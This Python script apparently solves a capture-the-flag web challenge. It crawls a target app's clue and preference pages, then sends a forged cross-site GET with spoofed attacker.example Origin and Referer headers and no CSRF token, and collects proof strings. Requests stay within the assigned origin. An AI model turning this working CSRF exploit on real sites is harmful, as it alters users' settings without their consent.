#!/usr/bin/env python3
"""Demonstrate a same-origin state change via a cross-site GET preference link."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
from html.parser import HTMLParser
import hashlib
import http.cookiejar
import json
from pathlib import Path
import re
import sys
from urllib.error import HTTPError
from urllib.parse import urlencode, urljoin, urlsplit
from urllib.request import HTTPCookieProcessor, Request, build_opener

from inspect_target import MAX_BODY_BYTES, normalize_url, origin, safe_filename


PROOF_RE = re.compile(rb"\bproof[_-][A-Za-z0-9_-]{12,}\b")


class PageParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.links: list[str] = []
        self.options: list[dict[str, str | bool]] = []
        self.current_destination = ""
        self._in_strong = False

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        values = {key.lower(): value or "" for key, value in attrs}
        if tag == "a" and values.get("href"):
            self.links.append(values["href"])
        elif tag == "option" and values.get("value"):
            self.options.append(
                {
                    "value": values["value"],
                    "selected": "selected" in values,
                }
            )
        elif tag == "strong":
            self._in_strong = True

    def handle_endtag(self, tag: str) -> None:
        if tag == "strong":
            self._in_strong = False

    def handle_data(self, data: str) -> None:
        if self._in_strong:
            self.current_destination += data.strip()


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Follow an app's own preference form and test its cross-site GET behavior."
    )
    parser.add_argument("target", help="absolute target URL assigned by the Game Master")
    parser.add_argument("--output-dir", type=Path, help="directory for response evidence")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()
    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
    except ValueError as exc:
        parser.error(str(exc))
    if args.timeout <= 0:
        parser.error("--timeout must be greater than zero")

    host = urlsplit(target).hostname or "target"
    output_dir = args.output_dir or Path("web-tools/evidence") / f"{host}-csrf"
    output_dir.mkdir(parents=True, exist_ok=True)
    jar = http.cookiejar.CookieJar()
    opener = build_opener(HTTPCookieProcessor(jar))
    records: list[dict[str, object]] = []

    def get(url: str, *, forged: bool = False) -> bytes:
        normalized = normalize_url(url)
        if origin(normalized) != allowed_origin:
            raise ValueError(f"refusing off-origin request: {normalized}")
        headers = {
            "User-Agent": "HuntressCTF-Web-Solver/1.0",
            "Accept": "*/*",
        }
        if forged:
            headers.update(
                {
                    "Origin": "https://attacker.example",
                    "Referer": "https://attacker.example/forge",
                }
            )
        request = Request(normalized, headers=headers, method="GET")
        try:
            response = opener.open(request, timeout=args.timeout)
        except HTTPError as exc:
            response = exc
        body = response.read(MAX_BODY_BYTES + 1)
        truncated = len(body) > MAX_BODY_BYTES
        body = body[:MAX_BODY_BYTES]
        index = len(records) + 1
        body_path = output_dir / safe_filename(index, normalized)
        body_path.write_bytes(body)
        records.append(
            {
                "requested_url": normalized,
                "status": getattr(response, "status", response.code),
                "body_sha256": hashlib.sha256(body).hexdigest(),
                "body_bytes": len(body),
                "body_truncated": truncated,
                "body_file": body_path.name,
            }
        )
        if truncated:
            raise ValueError(f"response exceeded {MAX_BODY_BYTES} bytes")
        return body

    root_body = get(target)
    root_parser = PageParser()
    root_parser.feed(root_body.decode("utf-8", errors="replace"))
    clue_link = next((href for href in root_parser.links if "clues" in href), None)
    if clue_link is None:
        raise ValueError("no challenge-provided clue link found on the target home page")
    clues_url = normalize_url(urljoin(target, clue_link))
    if origin(clues_url) != allowed_origin:
        raise ValueError("challenge clue link leaves the assigned origin")
    clues = json.loads(get(clues_url).decode("utf-8"))

    preferences_url = normalize_url(urljoin(target, str(clues["preferences_route"])))
    action_url = normalize_url(urljoin(target, str(clues["feature_route"])))
    if origin(preferences_url) != allowed_origin or origin(action_url) != allowed_origin:
        raise ValueError("challenge-provided route leaves the assigned origin")
    preferences_body = get(preferences_url)
    preferences_parser = PageParser()
    preferences_parser.feed(preferences_body.decode("utf-8", errors="replace"))
    explicitly_selected = [
        option for option in preferences_parser.options if option["selected"]
    ]
    if explicitly_selected:
        candidates = [
            option["value"]
            for option in preferences_parser.options
            if not option["selected"]
        ]
    else:
        candidates = [
            option["value"]
            for option in preferences_parser.options
            if option["value"] != preferences_parser.current_destination
        ]
    if not candidates:
        raise ValueError("no alternative destination was exposed by the preference form")
    destination = candidates[0]
    attack_url = action_url + "?" + urlencode({"destination": destination})
    change_body = get(attack_url, forged=True)

    state_href = next(
        (href for href in preferences_parser.links if "preferences" in href and "api" in href),
        None,
    )
    if state_href is None:
        raise ValueError("no preference state link found on the preference page")
    state_url = normalize_url(urljoin(preferences_url, state_href))
    if origin(state_url) != allowed_origin:
        raise ValueError("preference state link leaves the assigned origin")
    state_body = get(state_url)
    proofs = list(dict.fromkeys(PROOF_RE.findall(change_body + state_body)))
    report = {
        "target": target,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "current_user": clues.get("current_user"),
        "preferences_url": preferences_url,
        "cross_site_request": {
            "method": "GET",
            "url": attack_url,
            "destination": destination,
            "origin": "https://attacker.example",
            "csrf_token_sent": False,
        },
        "verified_state_url": state_url,
        "proofs": [proof.decode("ascii") for proof in proofs],
        "responses": records,
    }
    report_path = output_dir / "report.json"
    report_path.write_text(
        json.dumps(report, indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
    )
    print(json.dumps({"report": str(report_path), **report["cross_site_request"], "proofs": report["proofs"]}, indent=2))
    return 0 if proofs else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (OSError, ValueError, KeyError, json.JSONDecodeError) as exc:
        print(json.dumps({"error": str(exc)}, indent=2), file=sys.stderr)
        sys.exit(1)
